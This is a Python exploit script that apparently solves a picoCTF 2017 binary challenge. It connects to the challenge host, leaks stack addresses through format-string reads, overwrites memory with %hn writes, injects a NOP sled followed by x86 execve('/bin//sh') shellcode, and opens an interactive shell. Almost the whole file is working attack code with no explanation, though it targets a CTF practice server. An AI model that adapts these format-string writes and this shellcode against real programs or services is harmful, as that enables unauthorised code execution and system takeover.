import struct, time, telnetlib
from socket import *

def recv_timeout(the_socket,timeout=2):
    the_socket.setblocking(0)
    total_data=[]
    data=''
    begin=time.time()
    while 1:
        if total_data and time.time()-begin > timeout:
            break
        elif time.time()-begin > timeout*2:
            break
        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data)
                begin = time.time()
            else:
                time.sleep(0.1)
        except:
            pass
    the_socket.setblocking(1)
    return ''.join(total_data)

def indicator(exploit):
  return "ABCD"+exploit+"EFGH"

def value(reply):
  start = reply.index("ABCD")+4
  end = reply.index("EFGH")
  return reply[start:end]

s = socket(AF_INET, SOCK_STREAM)
s.connect(('shell2017.picoctf.com', 44887))

#INFORMATION GATHER
exploit = indicator("%5$x")
s.send(exploit+'\n')
tempFlag_addr = int(value(s.recv(2048)), 16)
exploit = indicator("%6$x")
s.send(exploit+'\n')
input_addr = int(value(s.recv(2048)), 16)

#PAYLOAD 1: Calculate stack base address
exploit = indicator("%9$x")
s.send(exploit+'\n')
data = value(s.recv(2048))
base_addr = int(data, 16) - 4*15

#PAYLOAD 2: Write 'flagSize' address to a location
flagSize_addr = hex(base_addr + 4*6)
portion = int(flagSize_addr[-4:], 16)
exploit = "%"+str(portion-0x81)+"x%17$hn"
s.send(exploit+'\n')
recv_timeout(s,5)

#DEBUG 2: Read Written Data
exploit = indicator("%53$x")
s.send(exploit+'\n')
print "flagSize: 0x"+value(s.recv(2048))

#PAYLOD 3: Replace 'flagSize' with 0xffff
exploit = "%"+str(0xffff-0x81)+"x%53$hn"
s.send(exploit+'\n')
recv_timeout(s,5)

#DEBUG 3: Read Written Data
exploit = indicator("%7$x")
s.send(exploit+'\n')
print "flagSize*: "+value(s.recv(2048))








stack_19 = base_addr + 4*18

print
#Write 3rd pointer address
portion = int(hex(stack_19+2)[-4:], 16)
exploit = "\x00"*0x360 #Fill up input
exploit += "%"+str(portion)+"x%18$hn"
s.send(exploit+'\n')
recv_timeout(s)

#PAYLOAD 1: Write STRLEN_PLT to a location
exploit = "\x00"*0x360 #Fill up input
exploit += "%"+str(0x0804)+"x%55$hn"
s.send(exploit+'\n')
recv_timeout(s)

#Write 3rd pointer address
portion = int(hex(stack_19)[-4:], 16)
exploit = "\x00"*0x360 #Fill up input
exploit += "%"+str(portion)+"x%18$hn"
s.send(exploit+'\n')
recv_timeout(s)

#PAYLOAD 1: Write STRLEN_PLT to a location
exploit = "\x00"*0x360 #Fill up input
exploit += "%"+str(0x9984)+"x%55$hn"
s.send(exploit+'\n')
recv_timeout(s)






portion = tempFlag_addr // 10
remainder = tempFlag_addr % 10
exploit = "\x00"*0x360 #Fill up input
exploit += ("%"+str(portion)+"x")*9
exploit += "%"+str(portion+remainder)+"x%19$hn"
s.send(exploit+'\n')
recv_timeout(s)

#PAYLOD 5: Buffer overflow 'input' into 'tempFlag'
exploit = "\x90"*0x360 #Fill up input
exploit += "\x90"*0x100
exploit += "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
s.send(exploit+'\n')
print s.recv(2048)

s.send('whoami\n')

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
